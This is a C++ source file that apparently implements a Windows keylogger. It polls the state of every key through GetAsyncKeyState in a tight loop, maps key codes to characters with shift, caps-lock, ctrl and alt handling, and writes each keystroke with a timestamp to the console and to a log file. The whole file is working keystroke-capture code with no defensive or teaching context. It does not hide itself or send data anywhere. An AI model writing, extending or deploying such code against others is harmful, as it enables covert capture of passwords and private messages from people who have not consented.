#include "keylog.h"

KeyLogger::KeyLogger(const std::string& filePath) : running(true) {
  logFile = fopen(filePath.c_str(), "w"); // Open file in write mode
  if (!logFile) {
    spdlog::error("Failed to open log file: {}", filePath);
  } else {
    spdlog::info("Logging to file: {}", filePath);
  }
}

KeyLogger::~KeyLogger() {
  if (logFile) {
    fclose(logFile);
    logFile = nullptr;
  }
}

std::string KeyLogger::GetKeyName(int vkCode, bool shiftPressed, bool capsLock) {
  std::string result;

  if (vkCode >= 0x30 && vkCode <= 0x39) { // Numbers
    result = shiftPressed ? ")!@#$%^&*("[(vkCode - 0x30)] : (char)vkCode;
  } else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Letters
    bool upper = shiftPressed ^ capsLock;
    result = (char)(upper ? vkCode : vkCode + 32);
  } else {
    switch (vkCode) {
    case VK_SPACE:
      result = " ";
      break;
    case VK_RETURN:
      result = "[ENTER]";
      break;
    case VK_TAB:
      result = "[TAB]";
      break;
    case VK_BACK:
      result = "[BACKSPACE]";
      break;
    case VK_ESCAPE:
      result = "[ESC]";
      break;
    case VK_LEFT:
      result = "[LEFT]";
      break;
    case VK_RIGHT:
      result = "[RIGHT]";
      break;
    case VK_UP:
      result = "[UP]";
      break;
    case VK_DOWN:
      result = "[DOWN]";
      break;
    case VK_OEM_1:
      result = shiftPressed ? ":" : ";";
      break;
    case VK_OEM_2:
      result = shiftPressed ? "?" : "/";
      break;
    case VK_OEM_3:
      result = shiftPressed ? "~" : "`";
      break;
    case VK_OEM_4:
      result = shiftPressed ? "{" : "[";
      break;
    case VK_OEM_5:
      result = shiftPressed ? "|" : "\\";
      break;
    case VK_OEM_6:
      result = shiftPressed ? "}" : "]";
      break;
    case VK_OEM_7:
      result = shiftPressed ? "\"" : "'";
      break;
    case VK_OEM_PLUS:
      result = shiftPressed ? "+" : "=";
      break;
    case VK_OEM_COMMA:
      result = shiftPressed ? "<" : ",";
      break;
    case VK_OEM_MINUS:
      result = shiftPressed ? "_" : "-";
      break;
    case VK_OEM_PERIOD:
      result = shiftPressed ? ">" : ".";
      break;
    default:
      result = "[VK_" + std::to_string(vkCode) + "]";
    }
  }
  return result;
}

void KeyLogger::StartLogging() {
  SHORT lastState[256] = {0};
  auto startTime = std::chrono::system_clock::now();

  while (running) {
    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool ctrlPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
    bool altPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    for (int vkCode = 0x01; vkCode <= 0xFE; vkCode++) {
      SHORT currentState = GetAsyncKeyState(vkCode);

      if ((currentState & 0x8000) && !(lastState[vkCode] & 0x8000)) {
        std::string keyName = GetKeyName(vkCode, shiftPressed, capsLock);

        std::string modifiers;
        if (ctrlPressed)
          modifiers += "[CTRL]+";
        if (altPressed)
          modifiers += "[ALT]+";
        if (shiftPressed)
          modifiers += "[SHIFT]+";

        std::lock_guard<std::mutex> lock(logMutex);
        std::string logEntry = modifiers + keyName;

        // Log to console
        spdlog::info("Key: {}", logEntry);

        // Log to file if open
        if (logFile) {
          auto now = std::chrono::system_clock::now();
          auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(now - startTime).count();
          fprintf(logFile, "[%lld ms] %s\n", timestamp, logEntry.c_str());
          fflush(logFile);
        }
      }
      lastState[vkCode] = currentState;
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(1));
  }
}